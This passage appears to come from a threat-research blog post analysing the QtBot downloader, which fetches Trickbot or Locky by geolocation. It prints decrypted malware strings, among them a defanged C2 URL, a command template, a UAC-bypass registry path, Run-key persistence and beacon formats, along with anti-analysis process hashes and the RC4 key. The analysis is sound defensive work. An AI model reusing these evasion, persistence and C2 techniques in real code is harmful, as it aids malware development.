<p><img class="aligncenter wp-image-48201" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_5.png" alt="QtBot_5" width="600" height="457" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_5.png 975w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_5-900x686.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_5-300x229.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_5-768x585.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_5-370x282.png 370w" sizes="(max-width: 600px) 100vw, 600px" /></p>
<p style="text-align: center;"><em>Figure 5. The downloader Trojan posts data back to the command and control server. This likely determines geolocation based targeting, this request led to the download of Trickbot as we used a UK based exit point. Trickbot download can be seen in Figure 6.  Note the user-agent header is identical to that of the connectivity check in Figure 4.</em></p>
<p>Due to the host being within the UK, we received an encrypted Trickbot payload. The decrypted Trickbot observed in the request below is 4fcee2679cc65585cc1c1c7baa020ec262a2b7fb9b8dc7529a8f73fab029afad.</p>
<p><img class="aligncenter wp-image-48225" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_6.png" alt="QtBot_6" width="600" height="457" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_6.png 975w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_6-900x686.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_6-300x229.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_6-768x585.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_6-370x282.png 370w" sizes="(max-width: 600px) 100vw, 600px" /></p>
<p style="text-align: center;"><em>Figure 6. Payload downloaded by the intermediate downloader. In this case, Trickbot.</em></p>
<p>In the following figures, we see a host POST data back to the C2 and receive a slightly different response. This is because the host is in a location not specifically targeted for Trickbot delivery. Thus, we expect to see a different download location and likely a Locky payload.<br />
<img class="aligncenter wp-image-48249" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_7.png" alt="QtBot_7" width="600" height="457" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_7.png 975w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_7-900x686.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_7-300x229.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_7-768x585.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_7-370x282.png 370w" sizes="(max-width: 600px) 100vw, 600px" /></p>
<p style="text-align: center;"><em>Figure 7.  The downloader Trojan posts data back to the command and control server. This likely determines geolocation based targeting, this request led to the download of Locky as we used a CA based exit point. Locky download can be seen in Figure 8.</em></p>
<p>Below we see a different payload from a different location due to the server’s response. In this case the payload is an encrypted Locky binary. This decrypted binary is 9d2ce15fd9112d52fa09c543527ef0b5bf07eb4c07794931c5768e403c167d49.<br />
<img class="aligncenter wp-image-48273" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_8.png" alt="QtBot_8" width="600" height="457" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_8.png 975w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_8-900x686.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_8-300x229.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_8-768x585.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_8-370x282.png 370w" sizes="(max-width: 600px) 100vw, 600px" /></p>
<p style="text-align: center;"><em>Figure 8. Payload downloaded by the intermediate downloader. In this case, Locky.</em></p>
<p>With the network behavior laid out from initial execution to payload delivery, lets take a closer look at the intermediate downloader, QtBot.<br />
<span style="font-size: 18pt;"><br />
QtBot Analysis</span><br />
The QtBot downloader is a Windows executable file that decrypts an importless stub into memory. This payload is later injected into msiexec.exe using common techniques.  The payload then decrypts the second stage shellcode and injects it into a newly spawned svchost.exe process.  This svchost.exe acts as the handler for the final payload.<br />
When QtBot initially executes, a new thread is created which is responsible for process scanning. This process scanning is used to identify analysis tools and, if any are found, terminate the malware’s further execution. This check is periodically repeated on a loop. Process hashes are calculated by lower casing the process name, calculating the crc32 of the result, and XORing the crc32 value with 0x2e5d47c8.  The XOR value appears to change on a regular basis, thus the hashes below only apply to 798aa42748dcb1078824c2027cf6a0d151c14e945cb902382fcd9ae646bfa120. The following hash values are checked against running processes:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f692881018ec309630504" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
0x171AF567
0xB713B22E
0x59F3573F - wireshark.exe
0xA9275283 - peid.exe
0x2C533BA3
0xB1FDD418 - x64dbg.exe
0xA7B71C08
0x5BBA66D5
0xFD62D761
0xB01C9DA9 - cff explorer.exe
0xE7AC4C20
0x8718A391 - procexp.exe
0x817D523A - ollydbg.exe
0x9A65393D - lordpe.exe
0x4B1B38C6 - processhacker.exe
0xBD46C402
0x72472F0B - tcpview.exe
0x151648CD
0x4A694A06 - vboxservice.exe
0x956511A3 - sbiesvc.exe
0x09D19890 - vmtoolsd.exe
0x70383CD2
0x40C795F0 - petools.exe
0x6D2607D8 - exeinfope.exe
0x4D9803BC - vboxtray.exe
0x29FBEE3C - windbg.exe
0x0872D0FC
0x28F7E9A8 - idaq.exe
0x3D0598D0 - x32dbg.exe
0x1D141E5D
0xFCB2810C - python.exe
0x2AA827DB
0xCA9B2CDE
0x75F4F636 - procmon.exe</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f692881018ec309630504-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018ec309630504-2">2</div><div class="crayon-num" data-line="crayon-5f692881018ec309630504-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018ec309630504-4">4</div><div class="crayon-num" data-line="crayon-5f692881018ec309630504-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018ec309630504-6">6</div><div class="crayon-num" data-line="crayon-5f692881018ec309630504-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018ec309630504-8">8</div><div class="crayon-num" data-line="crayon-5f692881018ec309630504-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018ec309630504-10">10</div><div class="crayon-num" data-line="crayon-5f692881018ec309630504-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018ec309630504-12">12</div><div class="crayon-num" data-line="crayon-5f692881018ec309630504-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018ec309630504-14">14</div><div class="crayon-num" data-line="crayon-5f692881018ec309630504-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018ec309630504-16">16</div><div class="crayon-num" data-line="crayon-5f692881018ec309630504-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018ec309630504-18">18</div><div class="crayon-num" data-line="crayon-5f692881018ec309630504-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018ec309630504-20">20</div><div class="crayon-num" data-line="crayon-5f692881018ec309630504-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018ec309630504-22">22</div><div class="crayon-num" data-line="crayon-5f692881018ec309630504-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018ec309630504-24">24</div><div class="crayon-num" data-line="crayon-5f692881018ec309630504-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018ec309630504-26">26</div><div class="crayon-num" data-line="crayon-5f692881018ec309630504-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018ec309630504-28">28</div><div class="crayon-num" data-line="crayon-5f692881018ec309630504-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018ec309630504-30">30</div><div class="crayon-num" data-line="crayon-5f692881018ec309630504-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018ec309630504-32">32</div><div class="crayon-num" data-line="crayon-5f692881018ec309630504-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018ec309630504-34">34</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f692881018ec309630504-1"><span class="crayon-cn">0x171AF567</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018ec309630504-2"><span class="crayon-cn">0xB713B22E</span></div><div class="crayon-line" id="crayon-5f692881018ec309630504-3"><span class="crayon-cn">0x59F3573F</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-v">wireshark</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018ec309630504-4"><span class="crayon-cn">0xA9275283</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-v">peid</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span></div><div class="crayon-line" id="crayon-5f692881018ec309630504-5"><span class="crayon-cn">0x2C533BA3</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018ec309630504-6"><span class="crayon-cn">0xB1FDD418</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-v">x64dbg</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span></div><div class="crayon-line" id="crayon-5f692881018ec309630504-7"><span class="crayon-cn">0xA7B71C08</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018ec309630504-8"><span class="crayon-cn">0x5BBA66D5</span></div><div class="crayon-line" id="crayon-5f692881018ec309630504-9"><span class="crayon-cn">0xFD62D761</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018ec309630504-10"><span class="crayon-cn">0xB01C9DA9</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-e">cff </span><span class="crayon-v">explorer</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span></div><div class="crayon-line" id="crayon-5f692881018ec309630504-11"><span class="crayon-cn">0xE7AC4C20</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018ec309630504-12"><span class="crayon-cn">0x8718A391</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-v">procexp</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span></div><div class="crayon-line" id="crayon-5f692881018ec309630504-13"><span class="crayon-cn">0x817D523A</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-v">ollydbg</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018ec309630504-14"><span class="crayon-cn">0x9A65393D</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-v">lordpe</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span></div><div class="crayon-line" id="crayon-5f692881018ec309630504-15"><span class="crayon-cn">0x4B1B38C6</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-v">processhacker</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018ec309630504-16"><span class="crayon-cn">0xBD46C402</span></div><div class="crayon-line" id="crayon-5f692881018ec309630504-17"><span class="crayon-cn">0x72472F0B</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-v">tcpview</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018ec309630504-18"><span class="crayon-cn">0x151648CD</span></div><div class="crayon-line" id="crayon-5f692881018ec309630504-19"><span class="crayon-cn">0x4A694A06</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-v">vboxservice</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018ec309630504-20"><span class="crayon-cn">0x956511A3</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-v">sbiesvc</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span></div><div class="crayon-line" id="crayon-5f692881018ec309630504-21"><span class="crayon-cn">0x09D19890</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-v">vmtoolsd</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018ec309630504-22"><span class="crayon-cn">0x70383CD2</span></div><div class="crayon-line" id="crayon-5f692881018ec309630504-23"><span class="crayon-cn">0x40C795F0</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-v">petools</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018ec309630504-24"><span class="crayon-cn">0x6D2607D8</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-v">exeinfope</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span></div><div class="crayon-line" id="crayon-5f692881018ec309630504-25"><span class="crayon-cn">0x4D9803BC</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-v">vboxtray</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018ec309630504-26"><span class="crayon-cn">0x29FBEE3C</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-v">windbg</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span></div><div class="crayon-line" id="crayon-5f692881018ec309630504-27"><span class="crayon-cn">0x0872D0FC</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018ec309630504-28"><span class="crayon-cn">0x28F7E9A8</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-v">idaq</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span></div><div class="crayon-line" id="crayon-5f692881018ec309630504-29"><span class="crayon-cn">0x3D0598D0</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-v">x32dbg</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018ec309630504-30"><span class="crayon-cn">0x1D141E5D</span></div><div class="crayon-line" id="crayon-5f692881018ec309630504-31"><span class="crayon-cn">0xFCB2810C</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-v">python</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018ec309630504-32"><span class="crayon-cn">0x2AA827DB</span></div><div class="crayon-line" id="crayon-5f692881018ec309630504-33"><span class="crayon-cn">0xCA9B2CDE</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018ec309630504-34"><span class="crayon-cn">0x75F4F636</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-v">procmon</span><span class="crayon-sy">.</span><span class="crayon-v">exe</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0012 seconds] -->
<p>The payload then creates randomly generated numerical mutex along with the registry key “HKCU\Software\QtProject”. This registry key has been used in the past by legitimate Qt framework software and is not strictly to be considered malicious on its own.<br />
Once the mutex and registry string are created, the malware uses RC4 with a hardcoded key to decrypt numerous strings which are reproduced below (note these strings are from 798aa42748dcb1078824c2027cf6a0d151c14e945cb902382fcd9ae646bfa120):</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f692881018f1202606151" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
cmd.exe
Software\Microsoft\Windows\CurrentVersion
boom
http://toundlefa[.]net/
Software\QtProject
msiexec.exe
svchost.exe
/c start %s &amp;&amp; exit
cmd.exe
\System32\CompMgmtLauncher.exe
runas
Software\Classes\mscfile
\shell\open\command
tmp_file
Software\Microsoft\Windows\CurrentVersion
\Policies\Explorer
\Run
Check Update
POST
Content-Type: application/octet-stream
Connection: close
DZCW
6VK3
regsvr32.exe
http://ds.download.windowsupdate.com/
{"rep":0,"bid":"%s","ver":%d,"cam":"%s","cis":%d,"lvl":%d,"adm":%d,"bit":%d,"osv":%d,"osb":%d,"tmt":%d}
{"rep":1,"bid":"%s","tid":"%s","res":%d}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f692881018f1202606151-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018f1202606151-2">2</div><div class="crayon-num" data-line="crayon-5f692881018f1202606151-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018f1202606151-4">4</div><div class="crayon-num" data-line="crayon-5f692881018f1202606151-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018f1202606151-6">6</div><div class="crayon-num" data-line="crayon-5f692881018f1202606151-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018f1202606151-8">8</div><div class="crayon-num" data-line="crayon-5f692881018f1202606151-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018f1202606151-10">10</div><div class="crayon-num" data-line="crayon-5f692881018f1202606151-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018f1202606151-12">12</div><div class="crayon-num" data-line="crayon-5f692881018f1202606151-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018f1202606151-14">14</div><div class="crayon-num" data-line="crayon-5f692881018f1202606151-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018f1202606151-16">16</div><div class="crayon-num" data-line="crayon-5f692881018f1202606151-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018f1202606151-18">18</div><div class="crayon-num" data-line="crayon-5f692881018f1202606151-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018f1202606151-20">20</div><div class="crayon-num" data-line="crayon-5f692881018f1202606151-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018f1202606151-22">22</div><div class="crayon-num" data-line="crayon-5f692881018f1202606151-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018f1202606151-24">24</div><div class="crayon-num" data-line="crayon-5f692881018f1202606151-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018f1202606151-26">26</div><div class="crayon-num" data-line="crayon-5f692881018f1202606151-27">27</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f692881018f1202606151-1"><span class="crayon-v">cmd</span><span class="crayon-sy">.</span><span class="crayon-e">exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018f1202606151-2"><span class="crayon-v">Software</span><span class="crayon-sy">\</span><span class="crayon-v">Microsoft</span><span class="crayon-sy">\</span><span class="crayon-v">Windows</span><span class="crayon-sy">\</span><span class="crayon-e">CurrentVersion</span></div><div class="crayon-line" id="crayon-5f692881018f1202606151-3"><span class="crayon-e">boom</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018f1202606151-4"><span class="crayon-v">http</span><span class="crayon-o">:</span><span class="crayon-c">//toundlefa[.]net/</span></div><div class="crayon-line" id="crayon-5f692881018f1202606151-5"><span class="crayon-v">Software</span><span class="crayon-sy">\</span><span class="crayon-e">QtProject</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018f1202606151-6"><span class="crayon-v">msiexec</span><span class="crayon-sy">.</span><span class="crayon-e">exe</span></div><div class="crayon-line" id="crayon-5f692881018f1202606151-7"><span class="crayon-v">svchost</span><span class="crayon-sy">.</span><span class="crayon-v">exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018f1202606151-8"><span class="crayon-o">/</span><span class="crayon-i">c</span><span class="crayon-h"> </span><span class="crayon-v">start</span><span class="crayon-h"> </span><span class="crayon-o">%</span><span class="crayon-v">s</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-e">exit</span></div><div class="crayon-line" id="crayon-5f692881018f1202606151-9"><span class="crayon-v">cmd</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018f1202606151-10"><span class="crayon-sy">\</span><span class="crayon-v">System32</span><span class="crayon-sy">\</span><span class="crayon-v">CompMgmtLauncher</span><span class="crayon-sy">.</span><span class="crayon-e">exe</span></div><div class="crayon-line" id="crayon-5f692881018f1202606151-11"><span class="crayon-e">runas</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018f1202606151-12"><span class="crayon-v">Software</span><span class="crayon-sy">\</span><span class="crayon-v">Classes</span><span class="crayon-sy">\</span><span class="crayon-i">mscfile</span></div><div class="crayon-line" id="crayon-5f692881018f1202606151-13"><span class="crayon-sy">\</span><span class="crayon-v">shell</span><span class="crayon-sy">\</span><span class="crayon-v">open</span><span class="crayon-sy">\</span><span class="crayon-e">command</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018f1202606151-14"><span class="crayon-e">tmp_file</span></div><div class="crayon-line" id="crayon-5f692881018f1202606151-15"><span class="crayon-v">Software</span><span class="crayon-sy">\</span><span class="crayon-v">Microsoft</span><span class="crayon-sy">\</span><span class="crayon-v">Windows</span><span class="crayon-sy">\</span><span class="crayon-i">CurrentVersion</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018f1202606151-16"><span class="crayon-sy">\</span><span class="crayon-v">Policies</span><span class="crayon-sy">\</span><span class="crayon-i">Explorer</span></div><div class="crayon-line" id="crayon-5f692881018f1202606151-17"><span class="crayon-sy">\</span><span class="crayon-e">Run</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018f1202606151-18"><span class="crayon-e">Check </span><span class="crayon-e">Update</span></div><div class="crayon-line" id="crayon-5f692881018f1202606151-19"><span class="crayon-e">POST</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018f1202606151-20"><span class="crayon-v">Content</span><span class="crayon-o">-</span><span class="crayon-v">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">application</span><span class="crayon-o">/</span><span class="crayon-v">octet</span><span class="crayon-o">-</span><span class="crayon-e">stream</span></div><div class="crayon-line" id="crayon-5f692881018f1202606151-21"><span class="crayon-v">Connection</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-e">close</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018f1202606151-22"><span class="crayon-i">DZCW</span></div><div class="crayon-line" id="crayon-5f692881018f1202606151-23"><span class="crayon-cn">6VK3</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018f1202606151-24"><span class="crayon-v">regsvr32</span><span class="crayon-sy">.</span><span class="crayon-e">exe</span></div><div class="crayon-line" id="crayon-5f692881018f1202606151-25"><span class="crayon-v">http</span><span class="crayon-o">:</span><span class="crayon-c">//ds.download.windowsupdate.com/</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018f1202606151-26"><span class="crayon-sy">{</span><span class="crayon-s">"rep"</span><span class="crayon-o">:</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-s">"bid"</span><span class="crayon-o">:</span><span class="crayon-s">"%s"</span><span class="crayon-sy">,</span><span class="crayon-s">"ver"</span><span class="crayon-o">:</span><span class="crayon-o">%</span><span class="crayon-v">d</span><span class="crayon-sy">,</span><span class="crayon-s">"cam"</span><span class="crayon-o">:</span><span class="crayon-s">"%s"</span><span class="crayon-sy">,</span><span class="crayon-s">"cis"</span><span class="crayon-o">:</span><span class="crayon-o">%</span><span class="crayon-v">d</span><span class="crayon-sy">,</span><span class="crayon-s">"lvl"</span><span class="crayon-o">:</span><span class="crayon-o">%</span><span class="crayon-v">d</span><span class="crayon-sy">,</span><span class="crayon-s">"adm"</span><span class="crayon-o">:</span><span class="crayon-o">%</span><span class="crayon-v">d</span><span class="crayon-sy">,</span><span class="crayon-s">"bit"</span><span class="crayon-o">:</span><span class="crayon-o">%</span><span class="crayon-v">d</span><span class="crayon-sy">,</span><span class="crayon-s">"osv"</span><span class="crayon-o">:</span><span class="crayon-o">%</span><span class="crayon-v">d</span><span class="crayon-sy">,</span><span class="crayon-s">"osb"</span><span class="crayon-o">:</span><span class="crayon-o">%</span><span class="crayon-v">d</span><span class="crayon-sy">,</span><span class="crayon-s">"tmt"</span><span class="crayon-o">:</span><span class="crayon-o">%</span><span class="crayon-v">d</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-5f692881018f1202606151-27"><span class="crayon-sy">{</span><span class="crayon-s">"rep"</span><span class="crayon-o">:</span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-s">"bid"</span><span class="crayon-o">:</span><span class="crayon-s">"%s"</span><span class="crayon-sy">,</span><span class="crayon-s">"tid"</span><span class="crayon-o">:</span><span class="crayon-s">"%s"</span><span class="crayon-sy">,</span><span class="crayon-s">"res"</span><span class="crayon-o">:</span><span class="crayon-o">%</span><span class="crayon-v">d</span><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0010 seconds] -->
<p>The hardcoded RC4 Key, 0x7A3C5B7CB7FCE715702AA0F4F4EC0935E759FD3B7B6BCC70159D61CF42814B81, is reused throughout this campaign to encrypt and decrypt network communications.<br />
QtBot includes a function which checks for the keyboard layouts common to former USSR countries, if any are found, execution is terminated. This routine is shown below:<br />
<img class="aligncenter wp-image-48297" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_9.png" alt="QtBot_9" width="600" height="357" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_9.png 975w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_9-900x535.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_9-300x178.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_9-768x457.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_9-370x220.png 370w" sizes="(max-width: 600px) 100vw, 600px" /></p>
